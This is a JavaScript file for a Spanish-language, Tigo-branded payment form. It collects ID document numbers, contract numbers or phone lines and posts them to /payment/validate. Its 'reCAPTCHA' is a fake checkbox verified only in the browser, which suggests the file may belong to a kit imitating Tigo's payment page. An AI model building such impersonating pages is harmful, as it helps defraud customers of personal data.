/**
 * Tigo Payment System - PHP Version
 * 
 * Main JavaScript Application
 */

(function() {
    'use strict';

    // Configuration
    const API_BASE = '';

    // State management
    let currentType = 'documento';
    let currentDocumentType = 'CC';

    // Initialize app
    document.addEventListener('DOMContentLoaded', function() {
        initButtonSelector();
        initDocumentModal();
        initPaymentForm();
        initCaptcha();
    });

    /**
     * Initialize button selector
     */
    function initButtonSelector() {
        const buttons = document.querySelectorAll('.button-option');
        
        buttons.forEach(button => {
            button.addEventListener('click', function() {
                buttons.forEach(btn => btn.classList.remove('active'));
                this.classList.add('active');
                
                currentType = this.dataset.type;
                updateFormFields(currentType);
            });
        });

        // Select first button by default
        if (buttons.length > 0) {
            buttons[0].click();
        }
    }

    /**
     * Update form fields based on type
     */
    function updateFormFields(type) {
        const container = document.getElementById('dynamicFields');
        
        switch(type) {
            case 'documento':
                container.innerHTML = `
                    <div class="form-group">
                        <label for="documentType" class="form-label">Tipo</label>
                        <button type="button" class="form-select-btn" id="documentTypeBtn">
                            <span class="form-select-btn__text">${currentDocumentType}</span>
                            <svg class="select-arrow" width="12" height="8" viewBox="0 0 12 8" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M1 1L6 6L11 1" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </button>
                        <input type="hidden" id="documentType" name="documentType" value="${currentDocumentType}">
                    </div>
                    <div class="form-group">
                        <label for="documentNumber" class="form-label">No. de documento</label>
                        <input type="text" id="documentNumber" name="documentNumber" class="form-input" 
                               placeholder="No. de documento" required>
                    </div>
                `;
                
                // Re-attach modal listener
                document.getElementById('documentTypeBtn').addEventListener('click', openDocumentModal);
                break;
                
            case 'hogar':
                container.innerHTML = `
                    <div class="form-group">
                        <label for="contractNumber" class="form-label">Contrato</label>
                        <input type="text" id="contractNumber" name="contractNumber" class="form-input" 
                               placeholder="Contrato" required>
                    </div>
                `;
                break;
                
            case 'linea':
                container.innerHTML = `
                    <div class="form-group">
                        <label for="phoneNumber" class="form-label">Línea Tigo</label>
                        <input type="text" id="phoneNumber" name="phoneNumber" class="form-input" 
                               placeholder="Línea Tigo" required>
                    </div>
                `;
                break;
        }
    }

    /**
     * Initialize document type modal
     */
    function initDocumentModal() {
        const modal = document.getElementById('documentTypeModal');
        const btnCancel = document.getElementById('btnCancelModal');
        const btnContinue = document.getElementById('btnContinueModal');

        if (btnCancel) {
            btnCancel.addEventListener('click', closeDocumentModal);
        }

        if (btnContinue) {
            btnContinue.addEventListener('click', function() {
                const selected = document.querySelector('input[name="documentTypeRadio"]:checked');
                if (selected) {
                    currentDocumentType = selected.value;
                    updateFormFields('documento');
                }
                closeDocumentModal();
            });
        }

        if (modal) {
            modal.addEventListener('click', function(e) {
                if (e.target === modal) {
                    closeDocumentModal();
                }
            });
        }
    }

    /**
     * Open document modal
     */
    function openDocumentModal() {
        const modal = document.getElementById('documentTypeModal');
        if (modal) {
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
    }

    /**
     * Close document modal
     */
    function closeDocumentModal() {
        const modal = document.getElementById('documentTypeModal');
        if (modal) {
            modal.classList.remove('active');
            document.body.style.overflow = '';
        }
    }

    /**
     * Initialize payment form
     */
    function initPaymentForm() {
        const form = document.getElementById('paymentForm');
        
        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                // Check captcha
                const captchaChecked = document.getElementById('recaptchaCheckbox').checked;
                if (!captchaChecked) {
                    alert('Por favor completa el captcha');
                    return;
                }

                // Gather form data
                const formData = new FormData(form);
                formData.append('type', currentType);
                formData.append('captcha_verified', captchaChecked ? '1' : '0');

                try {
                    const response = await fetch('/payment/validate', {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();

                    if (result.success) {
                        window.location.href = result.data.redirect_url;
                    } else {
                        displayErrors(result.errors || {error: result.error});
                    }
                } catch (error) {
                    console.error('Error:', error);
                    alert('Error al procesar el pago');
                }
            });
        }
    }

    /**
     * Initialize captcha
     */
    function initCaptcha() {
        const checkbox = document.getElementById('recaptchaCheckbox');
        
        if (checkbox) {
            checkbox.addEventListener('change', function() {
                const box = document.getElementById('customRecaptcha');
                if (this.checked) {
                    box.classList.add('verified');
                } else {
                    box.classList.remove('verified');
                }
            });
        }
    }

    /**
     * Display validation errors
     */
    function displayErrors(errors) {
        let message = 'Por favor corrige los siguientes errores:\n\n';
        
        for (const [field, error] of Object.entries(errors)) {
            message += `• ${error}\n`;
        }
        
        alert(message);
    }

})();
